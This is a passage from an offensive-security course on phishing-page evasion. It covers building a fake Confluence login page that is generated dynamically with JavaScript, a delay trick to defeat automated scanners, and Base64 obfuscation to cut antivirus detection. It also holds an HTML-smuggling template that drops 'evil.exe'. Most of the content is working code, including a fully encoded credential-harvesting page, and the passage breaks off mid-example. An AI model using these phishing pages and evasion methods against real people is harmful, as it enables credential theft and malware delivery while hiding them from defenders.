        var passwordInput = document.createElement("input");
        passwordInput.type = "password";
        passwordInput.id = "password";
        passwordInput.name = "password";
        passwordInput.required = true;
        passwordDiv.appendChild(passwordLabel);
        passwordDiv.appendChild(passwordInput);
        elem.appendChild(passwordDiv);

        var buttonDiv = document.createElement("div");
        var submitButton = document.createElement("button");
        submitButton.type = "submit";
        submitButton.textContent = "Log In";
        buttonDiv.appendChild(submitButton);
        elem.appendChild(buttonDiv);

        container.appendChild(elem);

        var forgotPasswordDiv = document.createElement("div");
        forgotPasswordDiv.className = "forgot-password";
        var forgotPasswordLink = document.createElement("a");
        forgotPasswordLink.href = "#";
        forgotPasswordLink.textContent = "Can't log in?";
        forgotPasswordDiv.appendChild(forgotPasswordLink);
        container.appendChild(forgotPasswordDiv);

        // Append the container to the body
        document.body.appendChild(container);

        // CSS styling
        var style = document.createElement("style");
        style.textContent = `
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f5f7;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                background-color: #ffffff;
                border: 1px solid #dfe1e6;
                border-radius: 5px;
                padding: 30px;
                width: 300px;
                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
                text-align: center;
            }
            .login-container h1 {
                font-size: 24px;
                margin-bottom: 20px;
                color: #0052cc;
            }
            .login-container label {
                display: block;
                margin-bottom: 5px;
                text-align: left;
            }
            .login-container input[type="text"],
            .login-container input[type="password"],
            .login-container button {
                width: 100%;
                max-width: 300px;
                padding: 10px;
                margin-bottom: 10px;
                border: 1px solid #dfe1e6;
                border-radius: 3px;
                box-sizing: border-box;
            }
            .login-container button {
                background-color: #0052cc;
                color: #ffffff;
                border: none;
                cursor: pointer;
                font-size: 16px;
            }
            .login-container button:hover {
                background-color: #0747a6;
            }
            .login-container .forgot-password {
                margin-top: 10px;
                font-size: 14px;
            }
            .login-container .forgot-password a {
                color: #0052cc;
                text-decoration: none;
            }
            .login-container .forgot-password a:hover {
                text-decoration: underline;
            }
        `;
        document.head.appendChild(style);
    }

    run(); // Invoke
    </script>
</head>
<body>
</body>
</html>

```

### Building a Scanning Script
In this section, we'll create a simple static scanner using a Bash script that retrieves the contents of a given URL, locates the `<form>` element, and extracts the value of its `action` attribute. The script uses `curl` to fetch the webpage and `grep` to parse the form's action attribute. If no `action` attribute is found, it notifies the user and exits.

```
#!/bin/bash

# Require URL as a command line argument
if [ -z "$1" ]; then
    echo "Usage: $0 <URL>"
    exit 1
fi

# Use curl to get the contents of page
content=$(curl -s "$1")

# Search for the form element and extract the action attribute
action=$(echo "$content" | grep -oP '(?i)<form[^>]*action="\K[^"]*')

# Check if action attribute was found
if [ -z "$action" ]; then
    echo "No form action attribute found"
    exit 1
fi

# Output the action attribute
echo "Form action attribute: $action"

```
Run the script against the static and dynamic page and notice the difference in results.

```
chmod +x ./simple-scanner.sh # Make it executable

./simple-scanner.sh https://example.com # Run

```

As demonstrated in the image above, dynamically generating the HTML elements caused the scanner to fail in locating the action attribute of our form. This occurs because our script assumes that the HTML element is present in the static content of the page. However, since the element is created dynamically via JavaScript, it only exists after the script has been executed, which curl is unable to do.

### Improving Script
Although the initial version of the script failed to locate the `action` attribute of our dynamically generated form, it's important to acknowledge that most real-world scanners are more sophisticated. Therefore, we'll show that it's still possible to fetch the value from the dynamically generated code by searching for the `.action` method and extracting its value.

```
#!/bin/bash

# Require URL as a command-line argument
if [ -z "$1" ]; then
    echo "Usage: $0 <URL>"
    exit 1
fi

# Use curl to fetch the contents of the page
content=$(curl -s "$1")

# Search for the form element and extract the action attribute
action=$(echo "$content" | grep -oP '(?i)<form[^>]*action="\K[^"]*')

# If the action attribute is not found, try searching for the `.action` method
if [ -z "$action" ]; then
    action=$(echo "$content" | grep ".action")
    exit 1
fi

# Output the action attribute
echo "Form action attribute: $action"

```

With a minor change to our script, we're able to successfully retrieve the `action` attribute's value from the dynamically generated function. Note that this was achieved since we have not applied any obfuscation to our JavaScript, which would have made the task considerably more challenging.

### Delaying Code Generation
Due to the rise in usage of JavaScript in phishing websites, security providers have had to update their scanning functionality to ensure that it's able to analyze the page during runtime. This means that simple scanners that run in the command line such as the one we created earlier are not effective.

To solve this issue, some vendors have shifted to using browser automation tools such as Selenium, Puppeteer, and Playwright to analyze phishing websites. Since we will be discussing and weaponizing these browser automation tools in future course updates, we will not go in-depth about the setup and usage of them. However, we've included a demo below that shows the usage of Puppeteer to launch a browser and extract the page's source code after the JavaScript runtime is completed.

The video can be found in folder: `./videos/puppeteer-demo.mp4`

One drawback is that if the browser automation tool doesn't wait long enough for the JavaScript to fully execute, it may fail to retrieve the dynamically generated content. For example, modify the invocation of the `run` function in our previous script to wait 10 seconds before executing.

```
// Comment it out or remove the run() function
// run()

// Add this instead
// Wait 10 seconds then invoke the function
setTimeout(run, 10000);

```
Since our automation script does not wait long enough, it's unable to retrieve the dynamically generated code.

The video can be found in folder: `./videos/demo-2-dynamic-code-gen.mp4`

## Conclusão
JavaScript provides a powerful way to dynamically generate content, making static analysis more difficult for defenders and automated scanners. Dynamically loading HTML elements during runtime can potentially defeat less sophisticated analysis scripts and tools, as we saw in this module.

## Objetivos
Convert a static HTML phishing page to be dynamically generated using JavaScript

Navigate to your dynamically generated phishing website via the browser and view page source

Compare the page source with the website's DOM


---

# Módulo 43 — Anti-Análise Via Ofuscação Base64

Módulo 43 — Anti-Analysis Via Base64 Obfuscation

- # Módulo 43 — Anti-Análise Via Ofuscação Base64

# Disclaimer

## Introdução
A simple yet effective method of detection that's utilized by security vendors is static signature detection on our frontend code (e.g. HTML, CSS, JavaScript). Due to the complete or partial reuse of phishing templates, this method forces attackers to spend more resources in building or obfuscating the templates.One solution is to utilize frontend obfuscation techniques to evade signature detection and make manual analysis difficult for defenders. As an example, we submit to VirusTotal a publicly available HTML smuggling template (discussed later in the course).
```
<!-- https://www.ired.team/offensive-security/defense-evasion/file-smuggling-with-html-and-javascript -->
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            var file = '';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var fileName = 'evil.exe';

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fileName);
            } else {
                var a = document.createElement('a');
                console.log(a);
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
    </body>
</html>

```
As expected, the publicly available template is signatured by several security vendors.However, if we obfuscate the code using Base64 and re-upload the file to VirusTotal, the number of vendors that can detect this code as malicious drops considerably. Although it is not a perfect obfuscation method, it remains to be highly effective against signature detection.This module will demonstrate the usage of Base64 to obfuscate frontend code and reduce detection rates.
## Ofuscação Via Base64
Base64 obfuscation is one of the simplest methods of obfuscation, where encoding and decoding can be performed using the btoa and atob functions, respectively. The code below demonstrates encoding and decoding the string "Maldev Academy" using Base64.
```
var maldev = "Maldev Academy";

// Base64 encode & print encoded string
var maldevEncoded = btoa(maldev);
console.log(maldevEncoded);

// Base64 decode & print decoded string
var maldevDecoded = atob(maldevEncoded);
console.log(maldevDecoded);

```

## Tratamento de Caracteres Especiais
In the previous example, we're only Base64-encoding a simple string. However, when we're Base64-encoding our phishing website, the content is likely to include various special characters such as quotes, angle brackets, and non-ASCII characters.The `btoa()` function only works with ASCII characters, which can lead to issues when encoding special characters. To properly handle these, we need to first convert the string to UTF-8 format before encoding and then reverse the process during decoding. This ensures that all characters, including non-ASCII ones, are preserved correctly.For example, if we try to run the following script we will be met with an error.
```
var maldev = "(Hello, 世界 & é)";

var maldevEncoded = btoa(maldev);
console.log(maldevEncoded);

var  maldevDecoded = atob(maldevEncoded);
console.log(maldevDecoded);

```
The solution is to use encodeURIComponent() before `btoa()` and decodeURIComponent() after `atob()` to ensure proper encoding and decoding without issues.
```
var maldev = "(Hello, 世界 & é)";

var maldevEncoded = btoa(encodeURIComponent(maldev));
console.log("Encoded:", maldevEncoded);

var maldevDecoded = decodeURIComponent(atob(maldevEncoded));
console.log("Decoded:", maldevDecoded);

```

## Document.write
Once the Base64 content is decoded, we need to inject the decoded HTML into the page dynamically. There are several ways to do this, one of the easiest methods is using the `document.write` function. The document.write function which, if called after the HTML document has been fully loaded, will clear the current document before writing the new content.To demonstrate how `document.write` works, we will run the following JavaScript snippet inside the Developer Tools console. This script will overwrite the current document with new HTML content and a popup alert. Executing this code will replace the entire document with the specified HTML, trigger the popup alert and then display "Maldev Academy" on the page.
```
document.write(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Maldev Academy</title>
</head>
<body>
    Maldev Academy
</body>
<script>alert("Pop up");</script>
</html>
`);

```

The page before execution.

- The page immediately after execution.

- The page after clicking the alert away.

## Renderização do HTML Decodificado
We can now use Base64 obfuscation with `document.write` to dynamically decode the Base64-encoded content and inject it into the page. The script below Base64 encodes the Confluence phishing page (created in earlier modules) and outputs the encoded result to the console.

```
// Phishing content
const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confluence Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dfe1e6;
            border-radius: 5px;
            padding: 30px;
            width: 300px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #0052cc;
        }
        .login-container label {
            display: block;
            margin-bottom: 5px;
            text-align: left;
        }
        .login-container input[type="text"],
        .login-container input[type="password"],
        .login-container button {
            width: 100%;
            max-width: 300px;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dfe1e6;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-container button {
            background-color: #0052cc;
            color: #ffffff;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background-color: #0747a6;
        }
        .login-container .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }
        .login-container .forgot-password a {
            color: #0052cc;
            text-decoration: none;
        }
        .login-container .forgot-password a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Log in to Confluence</h1>
        <form action="submit.php" method="POST">
            <div>
                <label for="username">Username or email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div>
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div>
                <button type="submit">Log In</button>
            </div>
        </form>
        <div class="forgot-password">
            <a href="#">Can't log in?</a>
        </div>
    </div>
</body>
</html>`;

const encodedHTML = btoa(encodeURIComponent(htmlContent));

console.log(encodedHTML);

```

Next, create an HTML file named `index.html` and use `document.write`, `decodeURIComponent`, and `atob` on the resulting Base64 from the previous step to dynamically decode and inject the content into the page.

```
<script>
document.write(decodeURIComponent(atob("JTNDIURPQ1RZUEUlMjBodG1sJTNFJTBBJTNDaHRtbCUyMGxhbmclM0QlMjJlbiUyMiUzRSUwQSUzQ2hlYWQlM0UlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwY2hhcnNldCUzRCUyMlVURi04JTIyJTNFJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMG5hbWUlM0QlMjJ2aWV3cG9ydCUyMiUyMGNvbnRlbnQlM0QlMjJ3aWR0aCUzRGRldmljZS13aWR0aCUyQyUyMGluaXRpYWwtc2NhbGUlM0QxLjAlMjIlM0UlMEElMjAlMjAlMjAlMjAlM0N0aXRsZSUzRUNvbmZsdWVuY2UlMjBMb2dpbiUzQyUyRnRpdGxlJTNFJTBBJTIwJTIwJTIwJTIwJTNDc3R5bGUlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBib2R5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1mYW1pbHklM0ElMjBBcmlhbCUyQyUyMHNhbnMtc2VyaWYlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBiYWNrZ3JvdW5kLWNvbG9yJTNBJTIwJTIzZjRmNWY3JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZGlzcGxheSUzQSUyMGZsZXglM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBqdXN0aWZ5LWNvbnRlbnQlM0ElMjBjZW50ZXIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBhbGlnbi1pdGVtcyUzQSUyMGNlbnRlciUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGhlaWdodCUzQSUyMDEwMHZoJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwbWFyZ2luJTNBJTIwMCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBiYWNrZ3JvdW5kLWNvbG9yJTNBJTIwJTIzZmZmZmZmJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYm9yZGVyJTNBJTIwMXB4JTIwc29saWQlMjAlMjNkZmUxZTYlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBib3JkZXItcmFkaXVzJTNBJTIwNXB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcGFkZGluZyUzQSUyMDMwcHglM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB3aWR0aCUzQSUyMDMwMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYm94LXNoYWRvdyUzQSUyMDAlMjAxcHglMjAzcHglMjByZ2JhKDAlMkMlMjAwJTJDJTIwMCUyQyUyMDAuMSklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB0ZXh0LWFsaWduJTNBJTIwY2VudGVyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwLmxvZ2luLWNvbnRhaW5lciUyMGgxJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1zaXplJTNBJTIwMjRweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMG1hcmdpbi1ib3R0b20lM0ElMjAyMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwY29sb3IlM0ElMjAlMjMwMDUyY2MlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAubG9naW4tY29udGFpbmVyJTIwbGFiZWwlMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBkaXNwbGF5JTNBJTIwYmxvY2slM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBtYXJnaW4tYm90dG9tJTNBJTIwNXB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdGV4dC1hbGlnbiUzQSUyMGxlZnQlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAubG9naW4tY29udGFpbmVyJTIwaW5wdXQlNUJ0eXBlJTNEJTIydGV4dCUyMiU1RCUyQyUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjBpbnB1dCU1QnR5cGUlM0QlMjJwYXNzd29yZCUyMiU1RCUyQyUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjBidXR0b24lMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB3aWR0aCUzQSUyMDEwMCUyNSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMG1heC13aWR0aCUzQSUyMDMwMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcGFkZGluZyUzQSUyMDEwcHglM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBtYXJnaW4tYm90dG9tJTNBJTIwMTBweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvcmRlciUzQSUyMDFweCUyMHNvbGlkJTIwJTIzZGZlMWU2JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYm9yZGVyLXJhZGl1cyUzQSUyMDNweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJveC1zaXppbmclM0ElMjBib3JkZXItYm94JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwLmxvZ2luLWNvbnRhaW5lciUyMGJ1dHRvbiUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJhY2tncm91bmQtY29sb3IlM0ElMjAlMjMwMDUyY2MlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBjb2xvciUzQSUyMCUyM2ZmZmZmZiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvcmRlciUzQSUyMG5vbmUlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBjdXJzb3IlM0ElMjBwb2ludGVyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1zaXplJTNBJTIwMTZweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjBidXR0b24lM0Fob3ZlciUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJhY2tncm91bmQtY29sb3IlM0ElMjAlMjMwNzQ3YTYlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAubG9naW4tY29udGFpbmVyJTIwLmZvcmdvdC1wYXNzd29yZCUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMG1hcmdpbi10b3AlM0ElMjAxMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1zaXplJTNBJTIwMTRweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjAuZm9yZ290LXBhc3N3b3JkJTIwYSUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGNvbG9yJTNBJTIwJTIzMDA1MmNjJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdGV4dC1kZWNvcmF0aW9uJTNBJTIwbm9uZSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjAuZm9yZ290LXBhc3N3b3JkJTIwYSUzQWhvdmVyJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdGV4dC1kZWNvcmF0aW9uJTNBJTIwdW5kZXJsaW5lJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTIwJTIwJTNDJTJGc3R5bGUlM0UlMEElM0MlMkZoZWFkJTNFJTBBJTNDYm9keSUzRSUwQSUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybG9naW4tY29udGFpbmVyJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaDElM0VMb2clMjBpbiUyMHRvJTIwQ29uZmx1ZW5jZSUzQyUyRmgxJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDZm9ybSUyMGFjdGlvbiUzRCUyMnN1Ym1pdC5waHAlMjIlMjBtZXRob2QlM0QlMjJQT1NUJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDZGl2JTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGFiZWwlMjBmb3IlM0QlMjJ1c2VybmFtZSUyMiUzRVVzZXJuYW1lJTIwb3IlMjBlbWFpbCUzQyUyRmxhYmVsJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaW5wdXQlMjB0eXBlJTNEJTIydGV4dCUyMiUyMGlkJTNEJTIydXNlcm5hbWUlMjIlMjBuYW1lJTNEJTIydXNlcm5hbWUlMjIlMjByZXF1aXJlZCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xhYmVsJTIwZm9yJTNEJTIycGFzc3dvcmQlMjIlM0VQYXNzd29yZCUzQyUyRmxhYmVsJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaW5wdXQlMjB0eXBlJTNEJTIycGFzc3dvcmQlMjIlMjBpZCUzRCUyMnBhc3N3b3JkJTIyJTIwbmFtZSUzRCUyMnBhc3N3b3JkJTIyJTIwcmVxdWlyZWQlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NidXR0b24lMjB0eXBlJTNEJTIyc3VibWl0JTIyJTNFTG9nJTIwSW4lM0MlMkZidXR0b24lM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZmb3JtJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJmb3Jnb3QtcGFzc3dvcmQlMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NhJTIwaHJlZiUzRCUyMiUyMyUyMiUzRUNhbid0JTIwbG9nJTIwaW4lM0YlM0MlMkZhJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGZGl2JTNFJTBBJTIwJTIwJTIwJTIwJTNDJTJGZGl2JTNFJTBBJTNDJTJGYm9keSUzRSUwQSUzQyUyRmh0bWwlM0U=")));
</script>

```

## Executing Decoded JavaScript
If your phishing content consists of pure JavaScript rather than HTML, you can use the eval function to execute a decoded script dynamically. `eval` allows JavaScript code stored as a string to be interpreted and run as part of the script. This means we can decode a Base64-encoded script and pass it to `eval` for execution, as shown in the example below.

First, we will Base64 encode the dynamically generated Confluence phishing page.

```
const scriptContent = `var container = document.createElement("div");
    container.className = "login-container";

    var heading = document.createElement("h1");
    heading.textContent = "Log in to Confluence";
    container.appendChild(heading);

    var elem = document.createElement("form");
    elem.action = "submit.php";
    elem.method = "POST";

    var usernameDiv = document.createElement("div");
    var usernameLabel = document.createElement("label");
    usernameLabel.htmlFor = "username";
    usernameLabel.textContent = "Username or email";
    var usernameInput = document.createElement("input");
    usernameInput.type = "text";
    usernameInput.id = "username";
    usernameInput.name = "username";
    usernameInput.required = true;
    usernameDiv.appendChild(usernameLabel);
    usernameDiv.appendChild(usernameInput);
    elem.appendChild(usernameDiv);

    var passwordDiv = document.createElement("div");
    var passwordLabel = document.createElement("label");
    passwordLabel.htmlFor = "password";
    passwordLabel.textContent = "Password";
    var passwordInput = document.createElement("input");
    passwordInput.type = "password";
    passwordInput.id = "password";
    passwordInput.name = "password";
    passwordInput.required = true;
    passwordDiv.appendChild(passwordLabel);
    passwordDiv.appendChild(passwordInput);
    elem.appendChild(passwordDiv);

    var buttonDiv = document.createElement("div");
    var submitButton = document.createElement("button");
    submitButton.type = "submit";
    submitButton.textContent = "Log In";
    buttonDiv.appendChild(submitButton);
    elem.appendChild(buttonDiv);

    container.appendChild(elem);

    var forgotPasswordDiv = document.createElement("div");
    forgotPasswordDiv.className = "forgot-password";
    var forgotPasswordLink = document.createElement("a");
    forgotPasswordLink.href = "#";
    forgotPasswordLink.textContent = "Can't log in?";
    forgotPasswordDiv.appendChild(forgotPasswordLink);
    container.appendChild(forgotPasswordDiv);

    // Append the container to the body
    document.body.appendChild(container);

    // CSS styling
    var style = document.createElement("style");
    style.textContent = \`
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dfe1e6;
            border-radius: 5px;
            padding: 30px;
            width: 300px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #0052cc;
        }
        .login-container label {
            display: block;
            margin-bottom: 5px;
            text-align: left;
        }
        .login-container input[type="text"],
        .login-container input[type="password"],
        .login-container button {
            width: 100%;
            max-width: 300px;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dfe1e6;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-container button {
            background-color: #0052cc;
            color: #ffffff;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background-color: #0747a6;
        }
        .login-container .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }
        .login-container .forgot-password a {
            color: #0052cc;
            text-decoration: none;
        }
        .login-container .forgot-password a:hover {
            text-decoration: underline;
        }
    \`;
    document.head.appendChild(style);
`;

const encodedScript = btoa(encodeURIComponent(scriptContent));

console.log(encodedScript);

```

Next, create an HTML file named `index.html` and use `eval`, `decodeURIComponent`, and `atob` on the resulting Base64 from the previous step to dynamically decode and inject the content into the page. Note that we will need the `<head>` and `<body>` tags to be statically available as the JavaScript adds content into these elements.

```
<head></head> <!-- REQUIRED -->
<body></body> <!-- REQUIRED -->
<script>
